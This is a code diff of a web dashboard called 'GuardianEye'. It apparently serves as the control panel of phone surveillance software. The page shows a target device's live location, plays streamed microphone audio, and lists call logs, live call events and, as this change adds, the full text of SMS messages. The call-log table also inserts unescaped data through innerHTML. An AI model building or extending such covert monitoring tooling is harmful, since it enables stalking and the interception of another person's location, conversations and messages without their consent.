@@ -43,60 +43,26 @@
       cursor: pointer;
       font-size: 16px;
     }
-    #startAudio:hover {
-      background: #0056b3;
+    #startAudio:hover { background: #0056b3; }
+    #audioStatus { text-align: center; margin-top: 5px; font-style: italic; }
+
+    /* Call logs table */
+    table { width: 100%; border-collapse: collapse; margin-top: 15px; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 6px rgba(0,0,0,0.1);}
+    th, td { border: 1px solid #ddd; padding: 8px; text-align: center; }
+    th { background: #007bff; color: #fff; }
+    tr:nth-child(even) { background: #f9f9f9; }
+
+    /* Real-time call events */
+    #callEventsList, #smsLogsList {
+      margin-top: 15px; padding: 10px; background: #fff; border: 1px solid #ddd; border-radius: 8px;
+      max-height: 200px; overflow-y: auto; box-shadow: 0 2px 6px rgba(0,0,0,0.1);
     }
-    #audioStatus {
-      text-align: center;
-      margin-top: 5px;
-      font-style: italic;
-    }
-    /* Call logs styling */
-    #callLogsTable {
-      width: 100%;
-      margin-top: 15px;
-      border-collapse: collapse;
-      background: #fff;
-      border-radius: 8px;
-      overflow: hidden;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-    }
-    #callLogsTable th, #callLogsTable td {
-      border: 1px solid #ddd;
-      padding: 8px;
-      text-align: center;
-    }
-    #callLogsTable th {
-      background: #007bff;
-      color: #fff;
-    }
-    #callLogsTable tr:nth-child(even) {
-      background: #f9f9f9;
-    }
-    /* Real-time call events styling */
-    #callEventsList {
-      margin-top: 15px;
-      padding: 10px;
-      background: #fff;
-      border: 1px solid #ddd;
-      border-radius: 8px;
-      max-height: 200px;
-      overflow-y: auto;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-    }
-    #callEventsList div {
-      margin-bottom: 5px;
-      padding: 5px;
-      border-bottom: 1px solid #eee;
-    }
-    #callEventsList div:last-child {
-      border-bottom: none;
-    }
+    #callEventsList div, #smsLogsList div { margin-bottom: 5px; padding: 5px; border-bottom: 1px solid #eee; }
+    #callEventsList div:last-child, #smsLogsList div:last-child { border-bottom: none; }
   </style>
 </head>
 <body>
   <h1>GuardianEye Dashboard</h1>
-
   <div id="status">🔴 Disconnected</div>
 
   <h2>Live Map</h2>
@@ -106,7 +72,6 @@
   <button id="startAudio">▶ Start Listening</button>
   <p id="audioStatus">Click the button to start audio.</p>
 
-  <!-- Call Logs Section -->
   <h2>📋 Call Logs</h2>
   <table id="callLogsTable">
     <thead>
@@ -122,10 +87,14 @@
     </tbody>
   </table>
 
-  <!-- Real-time Call Events Section -->
   <h2>📞 Real-time Call Events</h2>
   <div id="callEventsList">
     <div>Waiting for call events...</div>
+  </div>
+
+  <h2>💬 SMS Logs</h2>
+  <div id="smsLogsList">
+    <div>Waiting for SMS logs...</div>
   </div>
 
   <script>
@@ -135,110 +104,89 @@
     socket.on("connect", () => {
       statusDiv.innerText = "🟢 Connected to server";
       statusDiv.style.color = "green";
-
-      // Register this dashboard as listener
       socket.emit("listener-register");
-      console.log("Listener registered");
     });
-
-    socket.on("disconnect", () => {
-      statusDiv.innerText = "🔴 Disconnected";
-      statusDiv.style.color = "red";
-    });
+    socket.on("disconnect", () => { statusDiv.innerText = "🔴 Disconnected"; statusDiv.style.color = "red"; });
 
     // === MAP ===
     const map = L.map('map').setView([20, 78], 5);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      attribution: '© OpenStreetMap contributors'
-    }).addTo(map);
-
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap contributors' }).addTo(map);
     let marker;
     socket.on("location-update", (data) => {
       if (!data.lat || !data.lng) return;
-      if (!marker) {
-        marker = L.marker([data.lat, data.lng]).addTo(map);
-      } else {
-        marker.setLatLng([data.lat, data.lng]);
-      }
+      if (!marker) marker = L.marker([data.lat, data.lng]).addTo(map);
+      else marker.setLatLng([data.lat, data.lng]);
       map.setView([data.lat, data.lng], 15);
     });
 
     // === AUDIO ===
-    let audioContext = null;
-    let audioQueue = [];
-    let isPlaying = false;
-
+    let audioContext = null, audioQueue = [], isPlaying = false;
     document.getElementById("startAudio").addEventListener("click", () => {
       if (!audioContext) {
         audioContext = new (window.AudioContext || window.webkitAudioContext)();
         document.getElementById("audioStatus").innerText = "🎧 Listening...";
-        console.log("AudioContext started");
       }
       if (!isPlaying) playNextChunk();
     });
-
     function playNextChunk() {
-      if (!audioQueue.length || !audioContext) {
-        isPlaying = false;
-        return;
-      }
-
+      if (!audioQueue.length || !audioContext) { isPlaying=false; return; }
       const float32Array = audioQueue.shift();
       const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
       audioBuffer.copyToChannel(float32Array, 0);
-
       const bufferSource = audioContext.createBufferSource();
       bufferSource.buffer = audioBuffer;
       bufferSource.connect(audioContext.destination);
       bufferSource.onended = playNextChunk;
-      bufferSource.start();
-      isPlaying = true;
+      bufferSource.start(); isPlaying = true;
     }
-
     socket.on("audio-chunk", (base64Chunk) => {
       if (!audioContext) return;
-
       const byteString = atob(base64Chunk.replace(/\n/g,''));
       const buffer = new Uint8Array(byteString.length);
-      for (let i = 0; i < byteString.length; i++) buffer[i] = byteString.charCodeAt(i);
-
-      const float32Array = new Float32Array(buffer.length / 2);
-      for (let i = 0; i < float32Array.length; i++) {
-        let int16 = (buffer[i*2 +1] << 8) | buffer[i*2];
-        if (int16 >= 32768) int16 -= 65536;
-        float32Array[i] = int16 / 32768;
+      for (let i=0;i<byteString.length;i++) buffer[i]=byteString.charCodeAt(i);
+      const float32Array = new Float32Array(buffer.length/2);
+      for (let i=0;i<float32Array.length;i++){
+        let int16=(buffer[i*2+1]<<8)|buffer[i*2];
+        if(int16>=32768) int16-=65536;
+        float32Array[i]=int16/32768;
       }
-
       audioQueue.push(float32Array);
-      if (!isPlaying) playNextChunk();
+      if(!isPlaying) playNextChunk();
     });
 
     // === CALL LOGS ===
-    socket.on("call-logs", (logs) => {
-      const tbody = document.getElementById("callLogsBody");
-      tbody.innerHTML = "";
-      if (!logs || logs.length === 0) {
-        tbody.innerHTML = "<tr><td colspan='4'>No call logs available</td></tr>";
-        return;
-      }
-      logs.forEach(log => {
-        const row = document.createElement("tr");
-        row.innerHTML = `
-          <td>${log.number || "Unknown"}</td>
-          <td>${log.type}</td>
-          <td>${new Date(log.date).toLocaleString()}</td>
-          <td>${log.duration}</td>
-        `;
-        tbody.appendChild(row);
+    const callLogsBody = document.getElementById("callLogsBody");
+    socket.on("call-logs", logs => {
+      callLogsBody.innerHTML="";
+      if(!logs || logs.length===0) { callLogsBody.innerHTML="<tr><td colspan='4'>No call logs available</td></tr>"; return; }
+      logs.forEach(log=>{
+        const row=document.createElement("tr");
+        row.innerHTML=`<td>${log.number||"Unknown"}</td><td>${log.type}</td><td>${new Date(log.date).toLocaleString()}</td><td>${log.duration}</td>`;
+        callLogsBody.appendChild(row);
       });
     });
 
     // === REAL-TIME CALL EVENTS ===
     const callEventsList = document.getElementById("callEventsList");
-    socket.on("call-event", (event) => {
+    socket.on("call-event", event => {
       const div = document.createElement("div");
       div.innerText = `[${new Date().toLocaleTimeString()}] ${event.state} - ${event.number || "Unknown"}`;
-      callEventsList.prepend(div); // show latest on top
+      callEventsList.prepend(div);
+    });
+
+    // === SMS LOGS ===
+    const smsLogsList = document.getElementById("smsLogsList");
+    socket.on("sms-logs", smsArray => {
+      smsLogsList.innerHTML = "";
+      if(!smsArray || smsArray.length===0) {
+        smsLogsList.innerHTML="<div>No SMS logs available</div>";
+        return;
+      }
+      smsArray.forEach(sms => {
+        const div = document.createElement("div");
+        div.innerText = `[${new Date(sms.date).toLocaleString()}] ${sms.address || "Unknown"}: ${sms.body}`;
+        smsLogsList.appendChild(div);
+      });
     });
   </script>
 </body>
